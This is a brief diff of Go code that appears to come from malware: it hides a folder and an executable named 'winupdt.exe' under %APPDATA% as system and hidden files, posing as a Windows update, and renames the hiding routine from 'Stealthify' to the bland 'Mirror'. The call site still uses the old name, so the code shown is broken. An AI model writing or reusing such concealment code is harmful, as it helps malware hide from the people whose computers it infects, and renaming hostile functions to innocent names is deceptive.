@@ -10,7 +10,7 @@ func Install(){
   go Stealthify()
 }
 
-func Stealthify() {
+func Mirror() {
 	run("attrib +S +H %APPDATA%\\Windows_Update")
 	run("attrib +S +H %APPDATA%\\Windows_Update\\winupdt.exe")
 }
